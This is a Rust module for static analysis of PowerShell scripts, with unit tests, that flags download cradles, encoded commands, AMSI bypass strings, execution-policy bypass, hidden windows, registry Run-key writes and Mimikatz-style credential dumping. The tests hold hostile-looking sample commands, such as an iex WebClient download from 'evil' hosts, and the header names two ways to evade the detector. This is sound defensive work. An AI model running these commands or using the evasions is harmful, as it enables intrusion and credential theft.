//! PowerShell script static analysis
//!
//! See `.spec/` for the full specification.
//!
//! # Known limitations
//!
//! - **Backtick line continuation bypass**: PowerShell backtick (&#x60;) line continuation is not
//!   handled by the tokenizer. Malicious scripts can use backtick continuation to split
//!   detection keywords across lines. A future tokenizer rewrite will address this.
//! - **String concatenation bypass**: Dynamic string concatenation (e.g., `$env:co + "nfirmation"`) is
//!   not evaluated. Scripts can assemble evasion keywords at runtime. Resolving this requires
//!   expression evaluation, which is deferred to a follow-up effort.

#![forbid(unsafe_code)]
#![warn(missing_docs)]

use std::mem;

/// A normalized PowerShell command extracted from source.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PowerShellCommand {
    /// Command, cmdlet, alias, method, or executable name.
    pub name: String,
    /// Positional arguments and non-parameter tokens.
    pub arguments: Vec<String>,
    /// Cmdlet-style parameters as `(name, value)` pairs.
    pub parameters: Vec<(String, String)>,
    /// Zero-based position within its pipeline.
    pub pipeline_position: usize,
}

/// Output from lightweight PowerShell normalization.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct NormalizeResult {
    /// Commands extracted in source order.
    pub commands: Vec<PowerShellCommand>,
    /// Base64-like payloads supplied to `-EncodedCommand`, `-Enc`, or `-e`.
    pub encoded_commands: Vec<String>,
    /// Download-related command or object patterns found in the script.
    pub download_patterns: Vec<String>,
    /// `AMSI` (`AntiMalware` Scan Interface) bypass attempt indicators.
    pub amsi_bypass_indicators: Vec<String>,
    /// Whether execution policy bypass flags are present.
    pub execution_policy_bypass: bool,
    /// Hidden window flag indicators.
    pub hidden_window_indicators: Vec<String>,
    /// Registry modification indicators.
    pub registry_modification_indicators: Vec<String>,
    /// Credential access indicators.
    pub credential_access_indicators: Vec<String>,
    /// Process injection or credential dumping tool indicators.
    pub process_injection_indicators: Vec<String>,
}

/// Normalizes PowerShell source into security-relevant command facts.
///
/// This is intentionally a tokenizer-level normalizer, not a full PowerShell
/// AST. It preserves enough structure to identify pipelines, cmdlet parameters,
/// encoded commands, common download cradles, and dynamic execution aliases.
#[must_use]
pub fn normalize(source: &str) -> NormalizeResult {
    let tokens = tokenize(source);
    let mut normalizer = Normalizer::default();
    normalizer.consume(&tokens)
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct Token {
    kind: TokenKind,
    text: String,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum TokenKind {
    Word,
    String,
    Pipeline,
    CommandTerminator,
}

#[derive(Default)]
struct Normalizer {
    commands: Vec<PowerShellCommand>,
    encoded_commands: Vec<String>,
    download_patterns: Vec<String>,
    amsi_bypass_indicators: Vec<String>,
    execution_policy_bypass: bool,
    hidden_window_indicators: Vec<String>,
    registry_modification_indicators: Vec<String>,
    credential_access_indicators: Vec<String>,
    process_injection_indicators: Vec<String>,
    pipeline_position: usize,
}

impl Normalizer {
    fn consume(&mut self, tokens: &[Token]) -> NormalizeResult {
        let mut current = Vec::new();
        for token in tokens {
            match token.kind {
                TokenKind::Pipeline => {
                    self.flush_command(&mut current);
                    self.pipeline_position = self.pipeline_position.saturating_add(1);
                }
                TokenKind::CommandTerminator => {
                    self.flush_command(&mut current);
                    self.pipeline_position = 0;
                }
                TokenKind::Word | TokenKind::String => current.push(token.clone()),
            }
        }
        self.flush_command(&mut current);

        NormalizeResult {
            commands: mem::take(&mut self.commands),
            encoded_commands: mem::take(&mut self.encoded_commands),
            download_patterns: mem::take(&mut self.download_patterns),
            amsi_bypass_indicators: mem::take(&mut self.amsi_bypass_indicators),
            execution_policy_bypass: self.execution_policy_bypass,
            hidden_window_indicators: mem::take(&mut self.hidden_window_indicators),
            registry_modification_indicators: mem::take(&mut self.registry_modification_indicators),
            credential_access_indicators: mem::take(&mut self.credential_access_indicators),
            process_injection_indicators: mem::take(&mut self.process_injection_indicators),
        }
    }

    fn flush_command(&mut self, tokens: &mut Vec<Token>) {
        if tokens.is_empty() {
            return;
        }

        let command_tokens = mem::take(tokens);
        let Some(name_token) = command_tokens.first() else {
            return;
        };
        let name = normalize_token_text(&name_token.text);
        if name.is_empty() {
            return;
        }

        let mut arguments = Vec::new();
        let mut parameters = Vec::new();
        let mut index = 1;
        while index < command_tokens.len() {
            let token = normalize_token_text(&command_tokens[index].text);
            if is_parameter_name(&token) {
                let param_text = token.trim_start_matches('-');
                let (parameter, value) =
                    if let Some((param_name, param_val)) = param_text.split_once(':') {
                        (param_name.to_owned(), param_val.to_owned())
                    } else {
                        let value = command_tokens
                            .get(index.saturating_add(1))
                            .map(|candidate| normalize_token_text(&candidate.text))
                            .filter(|candidate| !is_parameter_name(candidate))
                            .unwrap_or_default();
                        if !value.is_empty() {
                            index = index.saturating_add(1);
                        }
                        (param_text.to_owned(), value)
                    };
                self.record_parameter(&name, &parameter, &value);
                parameters.push((parameter, value));
            } else {
                self.record_download_pattern(&token);
                self.record_amsi_bypass(&token);
                self.record_registry_modification(&name, "", &token);
                self.record_credential_access(&token, "");
                if command_tokens[index].kind != TokenKind::String {
                    self.record_process_injection(&token);
                }
                arguments.push(token);
            }
            index = index.saturating_add(1);
        }

        self.record_command_pattern(&name);
        self.record_amsi_bypass(&name);
        self.record_hidden_window(&name);
        self.record_execution_policy_bypass(&name);
        self.commands.push(PowerShellCommand {
            name,
            arguments,
            parameters,
            pipeline_position: self.pipeline_position,
        });
    }

    fn record_parameter(&mut self, cmd_name: &str, param_name: &str, value: &str) {
        let lowered = param_name.to_ascii_lowercase();
        if matches!(lowered.as_str(), "encodedcommand" | "enc" | "e") && looks_like_base64(value) {
            push_unique(&mut self.encoded_commands, value.to_owned());
        }
        self.record_execution_policy_bypass_value(param_name, value);
        self.record_hidden_window_value(param_name, value);
        self.record_download_pattern(value);
        self.record_amsi_bypass(value);
        self.record_registry_modification(cmd_name, param_name, value);
        self.record_credential_access(param_name, value);
        self.record_process_injection(param_name);
    }

    fn record_command_pattern(&mut self, name: &str) {
        let lowered = name.to_ascii_lowercase();
        let pattern = match lowered.as_str() {
            "invoke-webrequest" | "iwr" | "wget" | "curl" => Some("Invoke-WebRequest"),
            "invoke-restmethod" | "irm" => Some("Invoke-RestMethod"),
            "start-bitstransfer" => Some("Start-BitsTransfer"),
            "invoke-expression" | "iex" => Some("Invoke-Expression"),
            "invoke-command" | "icm" => Some("Invoke-Command"),
            _ => None,
        };
        if let Some(pattern) = pattern {
            push_unique(&mut self.download_patterns, pattern.to_owned());
        }
        self.record_download_pattern(name);
        self.record_credential_access_command(&lowered);
        self.record_process_injection_command(&lowered);
    }

    fn record_download_pattern(&mut self, value: &str) {
        let lowered = value.to_ascii_lowercase();
        let pattern = if lowered.contains("net.webclient") {
            Some("Net.WebClient")
        } else if lowered.contains("net.webrequest") {
            Some("Net.WebRequest")
        } else if lowered.contains("invoke-webrequest") {
            Some("Invoke-WebRequest")
        } else if lowered.contains("invoke-restmethod") {
            Some("Invoke-RestMethod")
        } else if lowered.contains("start-bitstransfer") {
            Some("Start-BitsTransfer")
        } else {
            None
        };
        if let Some(pattern) = pattern {
            push_unique(&mut self.download_patterns, pattern.to_owned());
        }
    }

    fn record_execution_policy_bypass(&mut self, name: &str) {
        let lowered = name.to_ascii_lowercase();
        if lowered == "executionpolicy" || lowered == "ep" || lowered == "exec" {
            self.execution_policy_bypass = true;
        }
    }

    fn record_execution_policy_bypass_value(&mut self, name: &str, value: &str) {
        let lowered_name = name.to_ascii_lowercase();
        let lowered_value = value.to_ascii_lowercase();
        if matches!(lowered_name.as_str(), "executionpolicy" | "ep" | "exec")
            && matches!(
                lowered_value.as_str(),
                "bypass" | "unrestricted" | "-bypass"
            )
        {
            self.execution_policy_bypass = true;
        }
    }

    fn record_hidden_window(&mut self, name: &str) {
        let lowered = name.to_ascii_lowercase();
        if lowered == "windowstyle" || lowered == "w" {
            self.hidden_window_indicators.push(name.to_owned());
        }
    }

    fn record_hidden_window_value(&mut self, name: &str, value: &str) {
        let lowered_name = name.to_ascii_lowercase();
        let lowered_value = value.to_ascii_lowercase();
        if matches!(lowered_name.as_str(), "windowstyle" | "w")
            && matches!(lowered_value.as_str(), "hidden" | "1" | "minimized")
        {
            push_unique(
                &mut self.hidden_window_indicators,
                format!("-{name} {value}"),
            );
        }
    }

    fn record_amsi_bypass(&mut self, value: &str) {
        let lowered = value.to_ascii_lowercase();
        // Check for specific AMSI bypass patterns
        if lowered.contains("[amsi]::") || lowered.contains("amsi]::") || lowered == "amsi::bypass"
        {
            push_unique(
                &mut self.amsi_bypass_indicators,
                "[Amsi]::Bypass".to_owned(),
            );
        }
        if lowered.contains("[scriptblock]::")
            || lowered.contains("scriptblock]::")
            || lowered == "scriptblock::logresurrection"
        {
            push_unique(
                &mut self.amsi_bypass_indicators,
                "[ScriptBlock]::LogResurrection".to_owned(),
            );
        }
        if lowered.contains("amsiutils") {
            push_unique(
                &mut self.amsi_bypass_indicators,
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')".to_owned(),
            );
        }
    }

    fn record_registry_modification(&mut self, cmd_name: &str, param_name: &str, value: &str) {
        let lowered_cmd = cmd_name.to_ascii_lowercase();
        let lowered_value = value.to_ascii_lowercase();

        let is_registry_cmd = matches!(
            lowered_cmd.as_str(),
            "set-itemproperty" | "new-itemproperty" | "remove-item" | "set-item" | "new-item"
        );
        let is_hklm = lowered_value.starts_with("hklm:\\") || lowered_value.starts_with("hklm:/");
        let is_hkcu = lowered_value.starts_with("hkcu:\\") || lowered_value.starts_with("hkcu:/");

        if is_registry_cmd && (is_hklm || is_hkcu) {
            let indicator = format!("{cmd_name} {param_name} {value}");
            push_unique(&mut self.registry_modification_indicators, indicator);
        }
    }

    fn record_credential_access_command(&mut self, name: &str) {
        let indicator: Option<&str> = match name {
            "get-credential" => Some("Get-Credential"),
            "convertto-securestring" => Some("ConvertTo-SecureString"),
            "convertfrom-securestring" => Some("ConvertFrom-SecureString"),
            _ => None,
        };
        if let Some(indicator) = indicator {
            push_unique(&mut self.credential_access_indicators, indicator.to_owned());
        }
    }

    fn record_credential_access(&mut self, name: &str, value: &str) {
        let lowered_name = name.to_ascii_lowercase();
        let lowered_value = value.to_ascii_lowercase();

        if lowered_name == "credential" && !lowered_value.is_empty() {
            push_unique(
                &mut self.credential_access_indicators,
                "-Credential *".to_string(),
            );
        }

        if matches!(lowered_name.as_str(), "get-wmiobject" | "get-ciminstance")
            && (lowered_value.contains("win32_") || lowered_value.contains("credential"))
        {
            push_unique(
                &mut self.credential_access_indicators,
                format!("{name} {value}"),
            );
        }
    }

    fn record_process_injection_command(&mut self, name: &str) {
        let lowered = name.to_ascii_lowercase();
        let indicator: Option<&str> = match lowered.as_str() {
            "invoke-reflectivepeinjection" => Some("Invoke-ReflectivePEInjection"),
            "invoke-mimikatz" => Some("Invoke-Mimikatz"),
            "mimikatz" => Some("Mimikatz"),
            "pwdump" => Some("pwdump"),
            "sekurlsa::logonpasswords" => Some("sekurlsa::logonpasswords"),
            _ => None,
        };
        if let Some(indicator) = indicator {
            push_unique(&mut self.process_injection_indicators, indicator.to_owned());
        }
    }

    fn record_process_injection(&mut self, name: &str) {
        let lowered = name.to_ascii_lowercase();
        if lowered.contains("inject")
            || lowered.contains("mimikatz")
            || lowered.contains("pwdump")
            || lowered.contains("logonpasswords")
        {
            push_unique(&mut self.process_injection_indicators, name.to_owned());
        }
    }
}

fn push_unique(values: &mut Vec<String>, value: String) {
    if !values.iter().any(|existing| existing == &value) {
        values.push(value);
    }
}

fn is_parameter_name(value: &str) -> bool {
    value.starts_with('-')
        && value.len() > 1
        && !value[1..]
            .chars()
            .all(|character| character.is_ascii_digit())
}

fn normalize_token_text(value: &str) -> String {
    let Some(first) = value.chars().next() else {
        return String::new();
    };
    if matches!(first, '\'' | '"') && value.ends_with(first) && value.len() >= 2 {
        return value[1..value.len().saturating_sub(1)].to_owned();
    }
    value.to_owned()
}

fn looks_like_base64(value: &str) -> bool {
    let candidate = value.trim();
    if candidate.len() < 8 || !candidate.len().is_multiple_of(4) {
        return false;
    }
    candidate
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'='))
}

fn tokenize(source: &str) -> Vec<Token> {
    let mut lexer = Lexer::new(source);
    lexer.tokenize();
    lexer.tokens
}

struct Lexer<'source> {
    chars: std::iter::Peekable<std::str::CharIndices<'source>>,
    tokens: Vec<Token>,
    current: String,
}

impl<'source> Lexer<'source> {
    fn new(source: &'source str) -> Self {
        Self {
            chars: source.char_indices().peekable(),
            tokens: Vec::new(),
            current: String::new(),
        }
    }

    fn tokenize(&mut self) {
        while let Some((_, character)) = self.chars.next() {
            match character {
                '\'' | '"' => self.push_quoted(character),
                '|' => self.push_delimiter(TokenKind::Pipeline, "|"),
                ';' | '\n' | '\r' => self.push_delimiter(TokenKind::CommandTerminator, ""),
                '#' => self.skip_comment(),
                '`' => self.push_escaped(),
                character if character.is_whitespace() => self.flush_word(),
                _ => self.current.push(character),
            }
        }
        self.flush_word();
    }

    fn push_quoted(&mut self, quote: char) {
        self.flush_word();
        let mut text = String::new();
        text.push(quote);
        while let Some((_, character)) = self.chars.next() {
            text.push(character);
            if character == '`' {
                if let Some((_, escaped)) = self.chars.next() {
                    text.push(escaped);
                }
                continue;
            }
            if character == quote {
                break;
            }
        }
        self.tokens.push(Token {
            kind: TokenKind::String,
            text,
        });
    }

    fn push_delimiter(&mut self, kind: TokenKind, text: &str) {
        self.flush_word();
        self.tokens.push(Token {
            kind,
            text: text.to_owned(),
        });
    }

    fn push_escaped(&mut self) {
        if let Some((_, escaped)) = self.chars.next() {
            self.current.push(escaped);
        }
    }

    fn skip_comment(&mut self) {
        self.flush_word();
        while let Some((_, character)) = self.chars.peek().copied() {
            if matches!(character, '\n' | '\r') {
                break;
            }
            self.chars.next();
        }
    }

    fn flush_word(&mut self) {
        if self.current.is_empty() {
            return;
        }
        self.tokens.push(Token {
            kind: TokenKind::Word,
            text: mem::take(&mut self.current),
        });
    }
}

#[cfg(test)]
mod tests {
    use super::normalize;

    #[test]
    fn extracts_simple_command() {
        let result = normalize("Get-Content file.txt");

        assert_eq!(result.commands.len(), 1);
        assert_eq!(result.commands[0].name, "Get-Content");
        assert_eq!(result.commands[0].arguments, ["file.txt"]);
        assert!(result.commands[0].parameters.is_empty());
    }

    #[test]
    fn detects_invoke_webrequest_download() {
        let result = normalize("Invoke-WebRequest -Uri http://evil.com");

        assert_eq!(result.commands[0].name, "Invoke-WebRequest");
        assert_eq!(
            result.commands[0].parameters,
            [("Uri".to_owned(), "http://evil.com".to_owned())]
        );
        assert_eq!(result.download_patterns, ["Invoke-WebRequest"]);
    }

    #[test]
    fn detects_encoded_command_parameter() {
        let result = normalize("powershell.exe -EncodedCommand SQBFAFgAIAAoAA==");

        assert_eq!(result.commands[0].name, "powershell.exe");
        assert_eq!(result.encoded_commands, ["SQBFAFgAIAAoAA=="]);
    }

    #[test]
    fn extracts_pipeline_commands() {
        let result = normalize("Get-Process | Stop-Process");

        assert_eq!(result.commands.len(), 2);
        assert_eq!(result.commands[0].name, "Get-Process");
        assert_eq!(result.commands[0].pipeline_position, 0);
        assert_eq!(result.commands[1].name, "Stop-Process");
        assert_eq!(result.commands[1].pipeline_position, 1);
    }

    #[test]
    fn preserves_double_quoted_interpolation() {
        let result = normalize("Write-Output \"Hello $name\"");

        assert_eq!(result.commands[0].name, "Write-Output");
        assert_eq!(result.commands[0].arguments, ["Hello $name"]);
    }

    #[test]
    fn detects_webclient_and_alias_patterns() {
        let result = normalize("iex (New-Object Net.WebClient).DownloadString('http://evil')");

        assert_eq!(result.commands[0].name, "iex");
        assert!(
            result
                .download_patterns
                .contains(&"Invoke-Expression".to_owned())
        );
        assert!(
            result
                .download_patterns
                .contains(&"Net.WebClient".to_owned())
        );
    }

    #[test]
    fn detects_amsi_bypass_reflection() {
        let result = normalize("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')");

        assert!(!result.amsi_bypass_indicators.is_empty());
        assert!(result.amsi_bypass_indicators.contains(
            &"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')".to_owned()
        ));
    }

    #[test]
    fn detects_amsi_bypass_bracket_syntax() {
        let result = normalize("[Amsi]::Bypass");

        assert!(!result.amsi_bypass_indicators.is_empty());
        assert!(
            result
                .amsi_bypass_indicators
                .contains(&"[Amsi]::Bypass".to_owned())
        );
    }

    #[test]
    fn detects_amsi_bypass_scriptblock() {
        let result = normalize("[ScriptBlock]::LogResurrection");

        assert!(!result.amsi_bypass_indicators.is_empty());
        assert!(
            result
                .amsi_bypass_indicators
                .contains(&"[ScriptBlock]::LogResurrection".to_owned())
        );
    }

    #[test]
    fn detects_execution_policy_bypass() {
        let result = normalize("powershell.exe -ExecutionPolicy Bypass -File evil.ps1");

        assert!(result.execution_policy_bypass);
    }

    #[test]
    fn detects_execution_policy_bypass_ep() {
        let result = normalize("powershell -ep bypass -file script.ps1");

        assert!(result.execution_policy_bypass);
    }

    #[test]
    fn detects_execution_policy_bypass_exec() {
        let result = normalize("powershell -Exec Bypass -Command 'evil'");

        assert!(result.execution_policy_bypass);
    }

    #[test]
    fn detects_hidden_window_style() {
        let result = normalize("powershell.exe -WindowStyle Hidden -Command evil");

        assert!(!result.hidden_window_indicators.is_empty());
        assert!(
            result
                .hidden_window_indicators
                .iter()
                .any(|i| i.contains("Hidden"))
        );
    }

    #[test]
    fn detects_hidden_window_w() {
        let result = normalize("powershell -w hidden -c evil");

        assert!(!result.hidden_window_indicators.is_empty());
    }

    #[test]
    fn detects_hidden_window_numeric() {
        let result = normalize("powershell -WindowStyle 1 -Command evil");

        assert!(!result.hidden_window_indicators.is_empty());
    }

    #[test]
    fn detects_registry_modification_hklm() {
        let result = normalize("Set-ItemProperty HKLM:\\Software\\Evil -Name 'Disabled' -Value 1");

        assert!(!result.registry_modification_indicators.is_empty());
    }

    #[test]
    fn detects_registry_modification_new_item_property() {
        let result = normalize(
            "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name 'Evil' -Value 'malware.exe'",
        );

        assert!(!result.registry_modification_indicators.is_empty());
    }

    #[test]
    fn detects_registry_modification_remove_item() {
        let result = normalize("Remove-Item HKLM:\\Software\\Evil -Recurse");

        assert!(!result.registry_modification_indicators.is_empty());
    }

    #[test]
    fn detects_credential_access_get_credential() {
        let result = normalize("Get-Credential");

        assert!(!result.credential_access_indicators.is_empty());
        assert!(
            result
                .credential_access_indicators
                .contains(&"Get-Credential".to_owned())
        );
    }

    #[test]
    fn detects_credential_access_convertto_securestring() {
        let result = normalize("ConvertTo-SecureString -String 'encrypted'");

        assert!(!result.credential_access_indicators.is_empty());
        assert!(
            result
                .credential_access_indicators
                .contains(&"ConvertTo-SecureString".to_owned())
        );
    }

    #[test]
    fn detects_credential_access_convertfrom_securestring() {
        let result = normalize("ConvertFrom-SecureString -SecureString $secure");

        assert!(!result.credential_access_indicators.is_empty());
        assert!(
            result
                .credential_access_indicators
                .contains(&"ConvertFrom-SecureString".to_owned())
        );
    }

    #[test]
    fn detects_credential_access_with_credential_parameter() {
        let result = normalize("Get-WmiObject -Class Win32_Process -Credential admin");

        assert!(!result.credential_access_indicators.is_empty());
    }

    #[test]
    fn detects_process_injection_reflective_pe() {
        let result = normalize("Invoke-ReflectivePEInjection");

        assert!(!result.process_injection_indicators.is_empty());
        assert!(
            result
                .process_injection_indicators
                .contains(&"Invoke-ReflectivePEInjection".to_owned())
        );
    }

    #[test]
    fn detects_process_injection_mimikatz() {
        let result = normalize("Invoke-Mimikatz");

        assert!(!result.process_injection_indicators.is_empty());
        assert!(
            result
                .process_injection_indicators
                .contains(&"Invoke-Mimikatz".to_owned())
        );
    }

    #[test]
    fn detects_process_injection_mimikatz_command() {
        let result = normalize("sekurlsa::logonpasswords");

        assert!(!result.process_injection_indicators.is_empty());
    }

    #[test]
    fn detects_start_bitstransfer() {
        let result =
            normalize("Start-BitsTransfer -Source http://evil.com/file.exe -Destination evil.exe");

        assert!(
            result
                .download_patterns
                .contains(&"Start-BitsTransfer".to_owned())
        );
    }

    #[test]
    fn detects_net_webrequest() {
        let result = normalize("$req = [Net.WebRequest]::Create('http://evil.com')");

        assert!(
            result
                .download_patterns
                .contains(&"Net.WebRequest".to_owned())
        );
    }

    #[test]
    fn no_false_positives_on_normal_commands() {
        let result = normalize("Get-Process | Select-Object Name, Id");

        assert!(result.amsi_bypass_indicators.is_empty());
        assert!(!result.execution_policy_bypass);
        assert!(result.hidden_window_indicators.is_empty());
        assert!(result.registry_modification_indicators.is_empty());
        assert!(result.credential_access_indicators.is_empty());
        assert!(result.process_injection_indicators.is_empty());
    }

    // Regression tests for Issue 2: Invoke-Command detection
    #[test]
    fn detects_invoke_command_dynamic_execution() {
        let result = normalize("Invoke-Command -ScriptBlock { iex \"evil\" }");

        assert!(
            result
                .download_patterns
                .contains(&"Invoke-Command".to_owned())
        );
    }

    #[test]
    fn detects_icm_alias() {
        let result = normalize("icm -ScriptBlock { Get-Process }");

        assert!(
            result
                .download_patterns
                .contains(&"Invoke-Command".to_owned())
        );
    }

    // Regression tests for Issue 4: Colon syntax
    #[test]
    fn detects_execution_policy_bypass_colon_syntax() {
        let result = normalize("powershell -ep:Bypass -File evil.ps1");

        assert!(result.execution_policy_bypass);
    }

    #[test]
    fn detects_hidden_window_colon_syntax() {
        let result = normalize("powershell -w:Hidden -Command evil");

        assert!(!result.hidden_window_indicators.is_empty());
    }

    // Regression test for Issue 5: Get-WmiObject false positive
    #[test]
    fn no_false_positive_get_wmiobject_without_credential() {
        let result = normalize("Get-WmiObject Win32_Process");

        assert!(result.credential_access_indicators.is_empty());
    }

    // Regression test for Issue 6: String literal false positive
    #[test]
    fn no_false_positive_invoke_mimikatz_string_literal() {
        let result = normalize("Write-Output \"Invoke-Mimikatz\"");

        assert!(result.process_injection_indicators.is_empty());
    }
}
